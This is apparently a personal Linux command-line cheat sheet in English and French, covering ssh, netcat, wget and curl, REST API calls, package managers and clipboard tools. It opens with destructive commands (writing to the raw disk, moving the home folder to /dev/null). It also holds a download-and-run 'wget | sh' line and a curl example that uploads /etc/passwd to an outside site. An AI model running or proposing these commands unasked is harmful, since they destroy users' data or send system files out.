	command – Run a command (can be any command.)
	it runs a command and sends the output of that command directly to your first hard drive, writing the data directly to the hard disk drive and damaging your file system.

	mv ~ /dev/null – Moves Your Home Directory to a Black Hole
	     /dev/null – Move your home folder to /dev/null, destroying all your files and deleting the original copies.
	   ~ – Represents your entire home folder.
	mv – Move the following file or directory to another location.

# REMOTE LOGIN (SSH AND TELNET)

	ssh user@host 					connet to host as user 
		ssh root@12.34.56.78  → then pwd...
	ssh -p port user@host 			connect using port p 
	ssh -D port user@host 			connect and use bind port 

	telnet host						Connect to the system using telnet port

# NETWORK…curl…wget

	w								Display who is online
	ping host						Send echo request to test connection

	IP		
		hostname -i					Display the IP address of the host (Lookup local ip address)
		ip addr show				Display all network interfaces and ip address (a iproute 2 command,powerful than ifconfig)
		ip address add 192.168.0.1 dev ethO	Set ip address
		
		ifconfig
		
	PORTS
		netstat -tupl				Listing all active listening ports
	
	DNS
		dig domain					Get DNS information for domain
		dig -X host					Reverse lookup host
		host google.com	Lookup 		DNS ip address for the name
		whois domain				Get who is information for domain
	
		nslookup www.google.com 	check DNS server IP address by

	nc (netcat)
 		
 		utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  
 		It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, 
 		and deal with both IPv4 and IPv6.  
 		Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending 
 		them to standard output, as telnet(1) does with some.

     	Common uses include:

           ·   simple TCP proxies
           ·   shell-script based HTTP clients and servers
           ·   network daemon testing
           ·   a SOCKS or HTTP ProxyCommand for ssh(1)
           ·   and much, much more

		https://medium.com/adamedelwiess/data-acquisition-6-an-introduction-to-the-computer-network-12f0bc5c7586

		nguinet@ngi5:~$ nc -l 11211              set a process that listens to port 11211
		
			open in browser: localhost:11211

			GET / HTTP/1.1
			Host: localhost:11211
			Connection: keep-alive
			Upgrade-Insecure-Requests: 1
			User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
			Sec-Fetch-Site: none
			Sec-Fetch-Mode: navigate
			Sec-Fetch-User: ?1
			Sec-Fetch-Dest: document
			Accept-Encoding: gzip, deflate, br
			Accept-Language: fr,en;q=0.9
			Cookie: _xsrf=2|10700a22|883bc2323326fd9ab177b0b710c6e0fb|1603557106; username-localhost-8890="2|1:0|10:1603902249|23:username-localhost-8890|44:OTA3YzEzNTUxZjMxNDc1Mzg0OGE4ZTFkNWRiYzU5ZTc=|fad0dccae9dfa6b6e53702babeb837126dc514e1e1da050896ca667919554853"; username-localhost-8889="2|1:0|10:1604416487|23:username-localhost-8889|44:NGJiODYyZmRiNjQzNDZjOTkyNDdjOWFmMzI0NDJhNzY=|fdeb8660e156d446ab103131442916379c7bf9bdda30abd65e81463aae63e855"; username-localhost-8888="2|1:0|10:1605274885|23:username-localhost-8888|44:Y2U5MWFiMDZkY2U3NDIxZjkwNTlkMzA2MGE1MjZkMTI=|d0ae0fae043cac395fe4e893d93263420b41a3dfd7e57ea2fe8df10f30b5b9d2"

		Use Ncat to Transfer File....
		https://medium.com/adamedelwiess/data-acquisition-6-an-introduction-to-the-computer-network-12f0bc5c7586

	ETHERNET
		ethtool ethO				Show ethernet status
		mii-tool ethO				Show ethernet status
			
# DOWNLOAD: wget, curl
	
	$ curl https://www.cnn.com > cnn.html	
	$ wget -O cnn.html https://www.cnn.com		
	

	wget file					Download file
    wget –i filenames.txt 	    Download multiple files (listed in filenames.txt)
	wget -c file 				Continue stopped download 
	wget -r url 				Recursively download files from url 
	
	-O,  --output-document=FILE      write documents to FILE

	cat urls.txt | xargs wget
	ls names*.json | xargs sed -i 's/"John"/"Johnny"/g'

	## wget			Downloads files from the provided internet link

		wget http://example.com/something -O – | sh – Downloads and Runs a Script
		                                         sh – Send the file to the sh command, which executes it if it’s a bash script.
		                                       | – Pipe (send) the output of the wget command (the file you downloaded) directly to another command.
	    http://example.com/something – Download the file from this location.
		wget – Downloads a file. (You may also see curl in place of wgeet)


		for quickly getting pages or downloads from a website.

		wget https://urloffile/file.exe

		wget -c www.example.com   If your download gets interrupted, you actually can actually use the -c flag, which will resume a partial download if an incomplete file is found in the current directory:
		The wget command can handle cookies, is a good candidate for scripting, and can recursively download entire websites in their original format.


	## curl 	Display/Download uri 

		curl -X POST "http://localhost:8000/login" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{\"email\":\"string\",\"password\":\"string\"}"
			  \___ Request                          \___ Headers                                                        \___ data
			
			
		While wget usually operates by producing files, curl by default uses standard output, making it incredibly useful for scripts and pipes. 
		It also supports a great number of protocols, and can handle more HTTP authentication methods than wget.
		While many systems will have curl installed by default, if your Ubuntu machine does not, you can type:
		sudo apt-get update
		sudo apt-get install curl

		While curl uses pipes normally, you can easily have it save its output to a file as well. 
		
		 -o, --output <file>
          Write output to <file> instead of stdout. If you are using {} or [] to fetch  multiple  documents,  you
          can  use '#' followed by a number in the <file> specifier. That variable will be replaced with the cur‐
          rent string for the URL being fetched.

          	curl http://{one,two}.site.com -o "file_#1.txt"
          	curl http://{site,host}.host[1-5].com -o "#1_#2"
			curl http://www.example.com -o file.html

			-O, --remote-name
          	Write  output to a local file named like the remote file we get.
			Downloading files and output it to a local file with the same name:
			curl -O www.google.com/index.html
		
		-X, --request <command>
          	Specifies a custom request method (other than GET)
          	GET, HEAD, POST and PUT

			-#, --progress-bar
          Make curl display progress as a simple progress bar instead of the standard, more informational, meter.

		-F, --form <name=content>
		 	curl -F password=@/etc/passwd www.mypasswords.com
		
		-i, --include
          (HTTP) Include the HTTP-header in the output.

		curl 	Client URL Request library
				curl: linux (or powershell)
				Command line tool to access to a network url ressource
				Client to get documents/files from or send documents to an FTP, GOPHER, HTTP or HTTPS server
				The command is designed to work without user interaction or any kind of interactivity.
				curl -s htpp://www.google.com | head -n 10 | echo

		Although it’s not part of the core Unix command set, the curl command is widely available on Unix systems. 
		To make sure it’s available on your system, we can use the which command, which looks to see if the given program is available at the command line.


		curl -s htpp://www.google.com | head -n 10 | echo
			
		$ which curl
		/usr/bin/curl

		curl -I https://www.learnenough.com/ to fetch the HTTP header
		HTTP/1.1 200 OK
		Date: Sun, 08 Oct 2017 08:10:48 GMT
		Content-Type: text/html; charset=utf-8
		Connection: keep-alive
		Set-Cookie: __cfduid=d408f7fe637c1bf87b5979fc3c27d60ac1507450248; expires=Mon, 08-Oct-18 08:10:48 GMT; path=/; domain=.learnenough.com; HttpOnly
		Status: 200 OK
		X-Frame-Options: SAMEORIGIN
		X-Xss-Protection: 1; mode=block
		X-Content-Type-Options: nosniff
		Cache-Control: max-age=0, private, must-revalidate
		X-Request-Id: 73a9ddb5-7e78-4edd-b599-d759f86c3ff0
		X-Runtime: 0.064232
		Via: 1.1 vegur
		Server: cloudflare-nginx
		CF-RAY: 3aa7a0335c843c3b-CDG




		https://curl.haxx.se/
		https://curl.haxx.se/download.html
		https://gist.github.com/tazjel/8735770  ****

		command-line knife for all HTTP requests, and much, much more. It's kind of arcane but powerful 

		curl: linux (or powershell)
		Command line tool to access to a network url ressource
		Client to get documents/files from or send documents to an FTP, GOPHER, HTTP or HTTPS server
		The command is designed to work without user interaction or any kind of interactivity.

		[curl samples](https://www.smashingmagazine.com/2018/01/understanding-using-rest-api/)

		curl --url 'https:xxXx/messages' /
		     --request 'POST' /
		     --header 'authorization: SharedAccessSignature sr=xx%...' /
		     --header 'Content-Type: application/json' /
			 --data '{"f1":"v1","f2":"v2"}'

		curl https://api.github.com
		curl -H "Content-Type: application/json" https://api.github.com
			  \___ Headers -H or --headers
		  curl -H "Content-Type: application/json" https://api.github.com -v
		  															       \___ view headers  (verbose)
		  															       				> refers to request headers
		  															       				< refers to the response headers
		curl -X POST http://localhost:3000/tokens -d '{ "email": "any@email.com", "password": "1111" }'
			  \____ request                        \___ data (post request)

		curl -X GET http://localhost:3000/ping

		curl -X POST \
		  http://localhost:3000/users \
		  -d '{
			"name": "John",
			"email": "any@email.com",
			"password": "1111",
			"address": "San Francisco, CA",
			"streetAddress": "Sunset blvd, 15"
		}'

	 	  curl -F "web=@index.html;type=text/html" url.com
	            \___ FORM: -F, --form <name=content>		             
	            curl -F "name=daniel;type=text/foo" url.com
	            


		curl -X GET 'http://localhost:3000/users?email=any@email.com' -H 'token: 48df0wibmpqz69rzgb5y'

		  curl -X PUT \
		  http://localhost:3000/users \
		  -H 'Content-Type: application/json' \
		  -H 'token: 48df0wibmpqz69rzgb5y' \
		  -d '{
			"name": "Bill",
			"email": "any@email.com"
		}'

		curl -X DELETE 'http://localhost:3000/users?email=any@email.com' -H 'token: b3xg95c3wp0ol1pk46vm'
		
		curl -X POST http://localhost:3000/tokens \
		  -d '{
			"email": "any@email.com",
			"password": "1111"
		}'

		curl -X GET 'http://localhost:3000/tokens?id=gjfek6ha08p2x8877mno'
		
		curl -X PUT \
		  http://localhost:3000/tokens \
		  -H 'Content-Type: application/json' \
		  -d '{
			"id": "gjfek6ha08p2x8877mno"
		}'
		
		curl -X DELETE 'http://localhost:3000/tokens?id=bivegzlqhs1z5q4np0yo'
		
		curl -X GET \
		  http://localhost:3000/menus \
		  -H 'token: 3c3nld8owylf927r5txu'
		
		curl -X GET \
		  http://localhost:3000/carts \
		  -H 'token: ket278eemafcehh9vq30'
		
		curl -X DELETE \
		  http://localhost:3000/carts \
		  -H 'token: ket278eemafcehh9vq30'
		
		curl -X PUT \
		  http://localhost:3000/carts \
		  -H 'Content-Type: application/json' \
		  -H 'token: sdvr4w4e85gw8slgycnt' \
		  -d '{
			"id": 4,
			"quantity": 2
		}'
		
		curl -X POST \
		  http://localhost:3000/orders \
		  -H 'Content-Type: application/json' \
		  -H 'token: 8l06rtpic4y4kps54pe4' \
		  -d '{
			"paymentSource": "tok_mastercard"
		}'
		
		curl -X GET \
		  'http://localhost:3000/orders?id=un2yhgqoajzmv76fozkd' \
		  -H 'token: 4dpj97yqr53druol20ru'



		* The data (or body)

			curl -X POST <URL> -d property1=value1
								\___ -d --data   only with POST, PUT, PATCH or DELETE

			curl -X POST https://requestb.in/1ix963n1 \
			  -H "Content-Type: application/json" \
			  -d '{
			  "property1":"value1",
			  "property2":"value2"
			}'

		Authentication With a username and password (also called basic authentication)
			curl -x POST -u "username:password" https://api.github.com/user/repos

	
		curl -s --user 'api:YOUR_API_KEY' \
		https://api.mailgun.net/v3/YOUR_DOMAIN_NAME/messages \
		-F from='Excited User <mailgun@YOUR_DOMAIN_NAME>' \
		-F to=YOU@YOUR_DOMAIN_NAME \
		-F to=bar@example.com \
		-F subject='Hello' \
		-F text='Testing some Mailgun awesomeness!'


		# Basics

		curl https://api.github.com/users/caspyin 					Makes a basic GET request to the specifed URI
	 	curl --include https://api.github.com/users/caspyin 		Includes HTTP-Header information in the output	

### Pass user credential to basic auth to access protected resources like a users starred gists, or private info associated with their profile

		    curl --user "caspyin:PASSWD" https://api.github.com/gists/starred
		    curl --user "caspyin:PASSWD" https://api.github.com/users/caspyin

		Passing just the username without the colon (`:`) will cause you to be prompted for your account password. 
		This avoids having your password in your command line history

		    curl --user "caspyin" https://api.github.com/users/caspyin

		## POST ##

### Use the `--request` (`-X`) flag along with `--data` (`-d`) to POST data

		    curl --user "caspyin" --request POST --data '{"description":"Created via API","public":"true","files":{"file1.txt":{"content":"Demo"}}' https://api.github.com/gists
		    
		    curl --user "caspyin" -X POST --data '{"description":"Created via API","public":"true","files":{"file1.txt":{"content":"Demo"}}' https://api.github.com/gists

### Of course `--data` implies POST so you don't have to also specify the `--request` flag

		    curl --user "caspyin" --data '{"description":"Created via API","public":"true","files":{"file1.txt":{"content":"Demo"}}' https://api.github.com/gists

### Here is an example that uses the old GitHub API (v2). You can use multiple `--data` flags

		    curl --data "login=caspyin" --data "token=TOKEN" https://github.com/api/v2/json/user/show/caspyin

### The post data gets combined into one so you can also just combine them yourself into a single `--data` flag

		    curl --data "login=caspyin&token=TOKEN" https://github.com/api/v2/json/user/show/caspyin

### You can tell curl to read from a file (`@`) to POST data

		    curl --user "caspyin" --data @data.txt https://api.github.com/gists 

### Or it can read from STDIN (`@-`)

		    curl --user "caspyin" --data @- https://api.github.com/gists
		    {
		      "description":"Test",
		      "public":false,
		      "files": {
		        "file1.txt": {
		          "content":"Demo"
		        }
		      }
		    }
		    end with ctrl+d

		### Headers ###

### Often when POSTing data you'll need to add headers for things like auth tokens or setting the content type. You can set a header using `-H`.

		    curl -H "Content-Type: application/json" -H "authToken: 349ab29a-xtab-423b-a5hc-5623bc39b8c8" --data '{}' https://api.example.com/endpoint


		### Dealing with HTTPS ###

### If an API doens't have an SSL cert but is using HTTPS you can tell curl to ignore the security by using `--insecure`. Be warned this is a very **"insecure"** thing to do and is only listed here for "educational purposes".

		    curl --insecure https://api.example.com/endpoint

### For my own reference mostly, here is where I first learned about using `--insecure` https://github.com/wayneeseguin/rvm/issues/1684

		# OAuth #

### The first thing to know is that your API Token (found in https://github.com/settings/admin) is not the same token used by OAuth. They are different tokens and you will need to generate an OAuth token to be authorized.

		Follow the API's instructions at http://developer.github.com/v3/oauth/ under the sections "Non-Web Application Flow" and "Create a new authorization" to become authorized.

### Note: Use Basic Auth once to create an OAuth2 token http://developer.github.com/v3/oauth/#oauth-authorizations-api

		    curl https://api.github.com/authorizations \
		    --user "caspyin" \
		    --data '{"scopes":["gist"],"note":"Demo"}'

### This will prompt you for your GitHub password and return your OAuth token in the response. It will also create a new Authorized application in your account settings https://github.com/settings/applications

		Now that you have the OAuth token there are two ways to use the token to make requests that require authentication (replace "OAUTH-TOKEN" with your actual token)

		    curl https://api.github.com/gists/starred?access_token=OAUTH-TOKEN
		    curl -H "Authorization: token OAUTH-TOKEN" https://api.github.com/gists/starred

### List the authorizations you already have

		    curl --user "caspyin" https://api.github.com/authorizations


		# Resources #

		* HTTParty - Ruby library that makes it easy to create HTTP requests https://github.com/jnunemaker/httparty
		* Hurl IT - An open source web application to play with curl options http://hurl.it

# SERVER WEB

	flask...

	yum install nodejs 
	yum install npm

	mkdir nodeapp && cd nodeapp
	npm init
	npm install --save express
	app.js
		const express = require('express')
		const app = express()
		app.get('/', (req, res) => res.send('Hello World!'))
		app.listen(3000, () => console.log('Node.js app listening on port 3000.'))

# PACKAGES: apt-get/yum

## PACKAGES MANAGERS: apt or yum

    rpm RedHat Package Manager

		rpm -i pkgname.rpm	 Install rpm based package
		rpm -e pkgname	     Remove package


	apt-get Advanced Packaging Tool

		utility is a powerful and free package management command line program, that is used to work with Ubuntu's APT (Advanced Packaging Tool) library to perform installation of new software packages, removing existing software packages, upgrading of existing software packages and even used to upgrading
		Chocolatey - kind of like apt-get, but for Windows			

### You’ll need to run apt-get along with the “sudo” command, which gives it superuser, or root, permissions. This allows the command to modify and install system files in the Linux environment. You’ll have to enter your current user account’s password when you use sudo.

		sudo apt-get update 					download up-to-date package lists from the software repositories:
		sudo apt-get install packagename		Install a Package
												sudo apt-get install ruby
		apt-cache search sometext 				search your downloaded package cache
		sudo apt-get upgrade 					Update All Your Installed Packages
												run the “sudo apt-get update” command before you run this command, as you need to update your package lists before apt-get will see the latest available versions.
		sudo apt-get remove packagename 		Uninstall a Package.  removes the package’s binary files, but not any associated 
		sudo apt-get purge packagename 			to remove everything associated (configuration files...) with the software package, run the following command
		sudo apt-get autoremove 				To remove any packages that were installed as dependencies and are no longer required

		sudo apt‐get update && sudo apt‐get upgrade  	Pull down any updates. Then reboot

		sudo apt-get install build-essential
		sudo apt-get install dos2unix
		sudo apt-get install bspatch
		sudo apt-get install default-jre (or jdk – I only do jre)
		sudo apt-get install webp
		sudo apt-get install imagemagick
		sudo apt-get install dialog
		sudo apt-get install python
		sudo apt-get install xmlstartlet
		
		or
		sudo apt‐get install build‐essential dos2unix bspatch default‐jre webp imagemagick dialog python  xmlstarlet 

	yum - Yellowdog Updater Modified
	
		gestionnaire de paquets
		CentOS, Fedora, RedHat...
		Il permet de gérer l’installation et la mise à jour des logiciels installés sur le système d’exploitation. 
		Il s’agit d’une surcouche de RPM, gérant à la fois les dépendances et les téléchargements de la même façon, que le fait APT sur Debian vis-à-vis d’Aptitude.

### REMARQUE : sous GNU/Linux tout est fichier, y compris les paquets logiciels permettant d’ajouter ou retirer des fonctionnalités au système d’exploitation. Ainsi, un paquetage (ou paquet), contient l’ensemble des fichiers nécessaires au bon fonctionnement d’un programme : binaires, bibliothèques, fichier de configuration, etc.

		Tout paquet RPM (du moins sur des distributions CentOS ou dérivées), possède l’extension .rpm (pour RedHat Package Manager), par opposition au paquetage Debian, qui possède l’extension .deb. En résumé, yum peut :

		Lister les mises à jour disponibles
		Lister les paquets installés
		Rechercher un paquet particulier
		Installer/Désinstaller un paquet
		Mettre à jour le système d’exploitation

		 /etc appelé yum.conf. Si l’on parcourt rapidement ce fichier, on découvre alors que le gestionnaire de paquets possède un cache dont l’emplacement est précisé par la variable cachedir, impliquant donc que l’on peut également connaitre à tout moment les dernières transactions effectuées. Ce cache peut être rafraîchit grâce à la commande ci-dessous :

		yum makecache

			https://www.it-connect.fr/comment-bien-debuter-avec-yum-cette-mine-dinformation/

			décrire l’histoire de la vie d’une machine aussi efficacement que n’importe quel agent. 

			REMARQUE : dans les fonctionnalités, sur des distributions Debian ou dérivées, le gestionnaire de paquetage s’appelle aptitude et possède globalement les mêmes fonctions que yum. Seules les commandes diffèrent légèrement.

			Ainsi, sur n’importe quelle distribution de type CentOS (ou dérivées : RedHat, Fedora et compagnie), cet utilitaire est présent et va permettre aux administrateurs de connaître dans les moindres détails les logiciels ou programmes installés. Il me semble important, alors qu’on parle en coulisse de remplacer yum par un autre utilitaire issu de Fedora : DNF, de lister un peu plus précisément de quoi est capable cette commande.

# INSTALL FROM SOURCE

	./configure	
	make	
	make install	

# LOOPS

	RunAll.sh
		#!/bin/sh
		for file in ./*.js
		do
		  $file
		done	


> sh -lc true
'C:\Windows\system32\drivers\etc\hosts' -> '/etc/hosts'
'C:\Windows\system32\drivers\etc\protocol' -> '/etc/protocols'
'C:\Windows\system32\drivers\etc\services' -> '/etc/services'
'C:\Windows\system32\drivers\etc\networks' -> '/etc/networks'		


# Broadcast Message: wall

    [root@smoker dale]# wall "hey you people"
    [root@smoker dale]#
    Broadcast message from root (pts/1) (Fri Oct 3 02:43:04 2003):
    hey you people
    [root@smoker dale]#


    Broadcast Message: My experiences
        micxz@mars:~> wall message.txt
        wall: will not read message.txt - use stdin.
        micxz@mars:~> cat message.txt | wall
        Broadcast Message from micxz@mars
        (/dev/pts/4) at 1:21 ...
        Hello'
        This is a cool thing you can do;
        Works nice;

        micxz@mars:~> wall
        testing typing now cntrl-D twice fast;
        Broadcast Message from micxz@mars
        (/dev/pts/4) at 1:21 ...
        testing typing now cntrl-D twice fast;
        Works also;


# COPY/PASTE FROM CMLINE

# Since Linux and Mac OS X are *Nix based systems, many commands would work on both platforms. However, some commands may not available on both platforms, for example pbcopy and pbpaste. These commands are exclusively available only on Mac OS X platform. The Pbcopy command will copy the standard input into clipboard. You can then paste the clipboard contents using Pbpaste command wherever you want.
https://ostechnix.com/how-to-use-pbcopy-and-pbpaste-commands-on-linux/
https://observablehq.com/@mbostock/file-size-visualizer?collection=@mbostock/applications

on Arch Linux and its derivatives, run: $ sudo pacman xclip xsel
# On Fedora: $ sudo dnf xclip xsel
# On Debian, Ubuntu, Linux Mint: $ sudo apt install xclip xsel

alias
	$ vi ~/.bashrc
	alias pbcopy='xclip -selection clipboard'
	alias pbpaste='xclip -selection clipboard -o'

$ echo "Welcome To OSTechNix!" | pbcopy
$ echo `pbpaste`
# Welcome To OSTechNix!
$ pbcopy < file.txt
$ pbpaste 
# Welcome To OSTechNix!
$ ps aux | pbcopy

